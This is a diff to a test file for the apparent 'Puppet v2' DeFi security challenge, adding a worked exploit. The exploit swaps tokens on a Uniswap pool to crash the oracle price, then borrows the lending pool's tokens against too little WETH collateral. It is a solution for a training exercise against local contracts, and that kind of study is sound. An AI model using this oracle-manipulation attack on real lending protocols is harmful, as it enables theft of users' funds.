@@ -82,6 +82,28 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // in practice this needs to all be run in a single transaction to prevent arb
+        let deadline = (await ethers.provider.getBlock('latest')).timestamp * 2
+        let tokensToSwap = await this.token.balanceOf(attacker.address)
+
+        await this.token.connect(attacker).approve(this.uniswapRouter.address,tokensToSwap.mul(2))
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(tokensToSwap,0,[this.token.address,this.weth.address],attacker.address,deadline) // swapping DVT for WETH will drive down the price of DVT relative to ETH
+
+        let requiredEth = await this.lendingPool.calculateDepositOfWETHRequired(ATTACKER_INITIAL_TOKEN_BALANCE)
+        await this.weth.connect(attacker).approve(this.lendingPool.address,requiredEth)
+        await this.weth.connect(attacker).deposit({value:requiredEth})
+        await this.lendingPool.connect(attacker).borrow(ATTACKER_INITIAL_TOKEN_BALANCE)
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(tokensToSwap,0,[this.token.address,this.weth.address],attacker.address,deadline) // making the pool more unbalanced
+
+        requiredEth = await this.lendingPool.calculateDepositOfWETHRequired(this.token.balanceOf(this.lendingPool.address))
+        await this.weth.connect(attacker).approve(this.lendingPool.address,requiredEth)
+        await this.weth.connect(attacker).deposit({value:requiredEth})
+        await this.lendingPool.connect(attacker).borrow(this.token.balanceOf(this.lendingPool.address))
+
+        requiredEth = (await this.uniswapRouter.getAmountsIn(ATTACKER_INITIAL_TOKEN_BALANCE,[this.weth.address,this.token.address]))[0] // eth required to get ATTACKER_INITIAL_TOKEN_BALANCE of DVT tokens
+        await this.uniswapRouter.connect(attacker).swapExactETHForTokens(0,[this.weth.address,this.token.address],attacker.address,deadline,{value:requiredEth})
+
     });
 
     after(async function () {
